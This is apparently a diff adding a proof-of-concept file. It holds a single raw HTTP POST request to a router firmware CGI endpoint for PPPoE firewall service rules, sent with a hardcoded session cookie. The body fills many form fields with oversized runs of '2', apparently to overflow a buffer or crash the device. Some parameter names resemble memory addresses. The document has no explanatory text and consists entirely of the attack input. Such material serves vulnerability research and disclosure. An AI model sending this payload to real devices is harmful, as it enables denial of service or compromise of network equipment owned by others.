@@ -1,0 +1,7 @@
+POST /fwSchedulePPP2.cgi?pppoe2_fw_serv_add.cgi HTTP/1.1
+HOST: 192.168.0.50
+Content-Type: text/html
+Cookie: uid=xhyxhy
+Content-Length: 582
+
+test=test&BAK_backup.htm=fw_cgi_get_dawzqme_param_pppoe2&ipv6_proto=22wzq222222222222222222222222222&back_page=1&error400=22222222&error401=0&error401_deny=22222222&error404=3&error404_notavail=22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222&error400_notsuport=22222222&wan_proto=1&pptp=2&autoBlock=22222222&Add=1&Edit=1&ruleSelect=1&Delete=1&port_del=1&BKS_service.htm=1&failure_head=1&port_edit=0&cancel=1&apply=1&skeyword=1&max_rule_num=1&0010d5fc=1&0014dc4c=1&pppoe2_fw_bks_block_type=1&0014ee7c=1
